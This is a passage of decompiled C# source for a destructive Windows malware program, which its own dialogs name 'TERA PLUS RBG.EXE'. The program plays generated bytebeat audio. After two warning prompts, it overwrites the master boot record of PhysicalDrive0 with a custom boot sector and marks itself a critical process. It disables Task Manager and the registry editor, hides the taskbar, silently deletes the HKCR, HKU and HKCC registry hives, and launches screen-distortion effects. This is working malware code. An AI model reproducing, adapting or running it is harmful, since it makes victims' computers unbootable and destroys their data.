		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((i * (((i / 2 >> 10) | (i % 16 * i >> 8)) & (8 * i >> 1) & 0x12)) | (-(i / 16) + 64));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte19(int hz, int secs)
	{
		//IL_016f: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)((i << (i >> 1) % (11 << (71 * ((i >> 1) & (i >> 10) & 0xD) >> 3))) ^ (i >> 19));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	private static void byte20(int hz, int secs)
	{
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		using MemoryStream memoryStream = new MemoryStream();
		BinaryWriter binaryWriter = new BinaryWriter(memoryStream);
		binaryWriter.Write("RIFF".ToCharArray());
		binaryWriter.Write(0u);
		binaryWriter.Write("WAVE".ToCharArray());
		binaryWriter.Write("fmt ".ToCharArray());
		binaryWriter.Write(16u);
		binaryWriter.Write((ushort)1);
		int num = 1;
		int num2 = 8;
		binaryWriter.Write((ushort)num);
		binaryWriter.Write((uint)hz);
		binaryWriter.Write((uint)(hz * num * num2 / 8));
		binaryWriter.Write((ushort)(num * num2 / 8));
		binaryWriter.Write((ushort)num2);
		binaryWriter.Write("data".ToCharArray());
		byte[] array = new byte[hz * secs];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(i / 8 >> (i >> 5) * i / (((i >> 4) & 3) + 4));
		}
		binaryWriter.Write((uint)(array.Length * num * num2 / 8));
		byte[] array2 = array;
		foreach (byte value in array2)
		{
			binaryWriter.Write(value);
		}
		binaryWriter.Seek(4, SeekOrigin.Begin);
		binaryWriter.Write((uint)(binaryWriter.BaseStream.Length - 8));
		memoryStream.Seek(0L, SeekOrigin.Begin);
		new SoundPlayer((Stream)memoryStream).PlaySync();
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern bool ShowWindow(int hWnd, int cmdShow);

	public static bool IsAdministrator()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	[STAThread]
	private static void Main()
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Invalid comparison between Unknown and I4
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Invalid comparison between Unknown and I4
		//IL_0325: Unknown result type (might be due to invalid IL or missing references)
		Random random = new Random();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Drawer drawer = new ReDrawer();
		Drawer drawer2 = new randomdrawer();
		Drawer drawer3 = new randomdrawer1();
		Drawer drawer4 = new Window();
		Drawer drawer5 = new Cur();
		Drawer drawer6 = new Windowtext();
		Drawer drawer7 = new Type();
		Drawer drawer8 = new Open();
		Drawer drawer9 = new SendM();
		Drawer drawer10 = new createfiles();
		Drawer drawer11 = new msg();
		Drawer drawer12 = new bb();
		Drawer drawer13 = new ends();
		if ((int)MessageBox.Show("YOUR ABOUT TO RUN A MALWARE CALLED TERA PLUS RBG.EXE. \n\r\n Use this Malware wisely this will cause data loss and makes your computer likely unbootable and wipe the c: drive. \n\r\n if you dont know what this malware does just click no to make your computer safe. do you want to execute this malware? you wont be able to use windows again! \n\r\n WARNING: THIS MALWARE COUNTAINS FLASHING LIGHTS AND LOUD NOISES.", "T.E.R.A GREEN BLUE RED", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256) == 6 && (int)MessageBox.Show(" THIS IS THE FINAL WARNING. \n\r\n if you have read the previous warning then... KEEP IN MIND YOUR PC IS GOING TO BE DESTROYED. CLICK YES DESTROYS YOUR PC. YOU WONT BE ABLE TO USE WINDOWS AGAIN. \n\r\n Creator KozaResponding2 IS NOT RESPONSIBLE FOR ANY DATA LOSS OR MADE DAMAGE TO YOUR COMPUTER. \n\r\n do you still want to execute this malware? this is your final chance to get rid of the program.", "T.E.R.A FINAL WARNING...", (MessageBoxButtons)4, (MessageBoxIcon)48, (MessageBoxDefaultButton)256) == 6)
		{
			byte[] lpBuffer = new byte[512]
			{
				250, 49, 192, 142, 208, 188, 0, 124, 251, 14,
				31, 184, 19, 0, 205, 16, 184, 0, 160, 142,
				192, 186, 200, 3, 48, 192, 238, 66, 185, 0,
				1, 49, 219, 190, 114, 125, 136, 216, 36, 63,
				48, 228, 1, 198, 172, 136, 196, 136, 194, 208,
				234, 48, 192, 238, 136, 224, 238, 136, 208, 238,
				254, 195, 226, 225, 49, 255, 48, 246, 185, 64,
				1, 48, 210, 136, 208, 42, 6, 46, 125, 136,
				244, 42, 38, 47, 125, 168, 128, 116, 2, 246,
				216, 246, 196, 128, 116, 2, 246, 220, 0, 224,
				36, 63, 187, 50, 125, 215, 136, 195, 136, 208,
				42, 6, 48, 125, 136, 244, 42, 38, 49, 125,
				168, 128, 116, 2, 246, 216, 246, 196, 128, 116,
				2, 246, 220, 0, 224, 36, 63, 215, 0, 216,
				2, 6, 43, 125, 170, 254, 194, 226, 180, 254,
				198, 128, 254, 200, 114, 168, 180, 2, 183, 0,
				182, 24, 138, 22, 44, 125, 205, 16, 180, 14,
				138, 30, 45, 125, 232, 35, 0, 254, 6, 41,
				125, 254, 6, 42, 125, 254, 6, 43, 125, 254,
				6, 45, 125, 254, 6, 46, 125, 254, 14, 47,
				125, 254, 14, 48, 125, 254, 6, 49, 125, 233,
				108, 255, 254, 6, 23, 125, 128, 62, 23, 125,
				5, 114, 55, 198, 6, 23, 125, 0, 138, 30,
				24, 125, 48, 255, 190, 25, 125, 1, 222, 1,
				222, 173, 9, 192, 117, 9, 198, 6, 24, 125,
				0, 190, 25, 125, 173, 186, 67, 0, 176, 182,
				238, 186, 66, 0, 238, 136, 224, 238, 228, 97,
				12, 3, 230, 97, 254, 6, 24, 125, 195, 0,
				0, 77, 13, 218, 11, 247, 9, 47, 11, 225,
				8, 247, 9, 119, 7, 0, 0, 0, 0, 0,
				0, 1, 80, 50, 240, 150, 32, 35, 38, 41,
				44, 47, 49, 52, 54, 56, 58, 59, 60, 61,
				61, 62, 62, 62, 61, 61, 60, 59, 58, 56,
				54, 52, 49, 47, 44, 41, 38, 35, 32, 29,
				26, 23, 20, 17, 15, 12, 10, 8, 6, 5,
				4, 3, 3, 2, 2, 2, 3, 3, 4, 5,
				6, 8, 10, 12, 15, 17, 20, 23, 26, 29,
				32, 35, 38, 41, 44, 47, 49, 52, 54, 56,
				58, 59, 60, 61, 61, 62, 62, 62, 61, 61,
				60, 59, 58, 56, 54, 52, 49, 47, 44, 41,
				38, 35, 32, 29, 26, 23, 20, 17, 15, 12,
				10, 8, 6, 5, 4, 3, 3, 2, 2, 2,
				3, 3, 4, 5, 6, 8, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				85, 170
			};
			IntPtr hfile = CreateFile("\\\\.\\PhysicalDrive0", 268435456u, 3u, IntPtr.Zero, 3u, 0u, IntPtr.Zero);
			WriteFile(hfile, lpBuffer, 512u, out var _, IntPtr.Zero);
			int processInformation = 1;
			int processInformationClass = 29;
			Process.EnterDebugMode();
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				registryKey2.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
			try
			{
				int hWnd = FindWindow("Shell_TrayWnd", "");
				ShowWindow(hWnd, 0);
			}
			catch
			{
			}
			Thread.Sleep(3000);
			drawer11.Start();
			drawer13.Start();
			try
			{
				string text = "reg delete HKCR /f";
				ProcessStartInfo startInfo = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + text,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo);
			}
			catch
			{
			}
			try
			{
				string text2 = "reg delete HKU /f";
				ProcessStartInfo startInfo2 = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + text2,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo2);
			}
			catch
			{
			}
			try
			{
				string text3 = "reg delete HKCC /f";
				ProcessStartInfo startInfo3 = new ProcessStartInfo
				{
					FileName = "cmd.exe",
					Arguments = "/C " + text3,
					Verb = "runas",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false
				};
				Process.Start(startInfo3);
			}
			catch
			{
			}
			try
			{
				int hWnd2 = FindWindow("Shell_TrayWnd", "");
				ShowWindow(hWnd2, 0);
			}
			catch
			{
			}
			if (!IsAdministrator())
			{
				MessageBox.Show("you must run as administrator to work. 1920x1080 can run easier and fast.", "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
				Environment.Exit(0);
			}
			Thread.Sleep(1000);
			drawer.Start();
			drawer2.Start();
			drawer3.Start();
			drawer12.Start();
			drawer4.Start();
			drawer5.Start();
			drawer6.Start();
			drawer7.Start();
			drawer8.Start();
			drawer9.Start();
			drawer10.Start();
		}
	}

	[DllImport("gdi32.dll")]
	public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(uint crColor);

	[DllImport("gdi32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool DeleteObject([In] IntPtr hObject);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr hdc(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

	[DllImport("gdi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

	[DllImport("gdi32.dll")]
	private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

	[DllImport("user32.dll")]
	private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

	[DllImport("gdi32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

	[DllImport("msimg32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, _BLENDFUNCTION ftn);

	[DllImport("gdi32.dll")]
	private static extern bool PlgBlt(IntPtr hdcDest, POINT[] lpPoint, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidth, int nHeight, IntPtr hbmMask, int xMask, int yMask);

	[DllImport("gdi32.dll")]
	private static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest, int nWidthDest, int nHeightDest, IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc, TernaryRasterOperations dwRop);

	[DllImport("user32.dll")]
	public static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	public static extern IntPtr GetWindowDC(IntPtr hWnd);

	[DllImport("Gdi32")]
	public static extern long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, [Out] IntPtr lpvBits);

	[DllImport("gdi32.dll")]
	public static extern int SetBitmapBits(IntPtr hbmp, int cBytes, IntPtr lpvBits);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);

	[DllImport("kernel32")]
	public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	[DllImport("gdi32.dll")]
	public static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	[DllImport("kernel32")]
	private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

	[DllImport("kernel32")]
	private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberBytesWritten, IntPtr lpOverlapped);

	[DllImport("user32.dll")]
	private static extern int GetFocus();

	[DllImport("user32.dll")]
	private static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);

	[DllImport("kernel32.dll")]
	private static extern uint GetCurrentThreadId();

	[DllImport("user32.dll")]
	private static extern uint GetWindowThreadProcessId(int hWnd, int ProcessId);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SendMessage(int hWnd, int Msg, int wParam, StringBuilder lParam);

	[DllImport("gdi32.dll")]
	private static extern bool DeleteDC(IntPtr hdc);

	[DllImport("user32.dll")]
	private static extern int GetSystemMetrics(int nIndex);

	[DllImport("gdi32.dll")]
	private static extern IntPtr CreateSolidBrush(IntPtr colorRef);

	[DllImport("user32.dll")]
	private static extern int FillRect(IntPtr hdc, ref RECT lprc, IntPtr hbr);

	[DllImport("msimg32.dll")]
	private static extern bool AlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION blendFunction);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDC(IntPtr hWnd);

	[DllImport("gdi32.dll")]
	private static extern int GetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, [Out] byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

	[DllImport("gdi32.dll")]
	private static extern int SetDIBits(IntPtr hdc, IntPtr hbmp, uint uStartScan, uint cScanLines, byte[] lpvBits, ref BITMAPINFO lpbi, uint uUsage);

	[DllImport("gdi32.dll")]
	private static extern uint GetPixel(IntPtr hdc, int x, int y);

	[DllImport("gdi32.dll")]
	private static extern bool SetPixelV(IntPtr hdc, int x, int y, uint color);
}
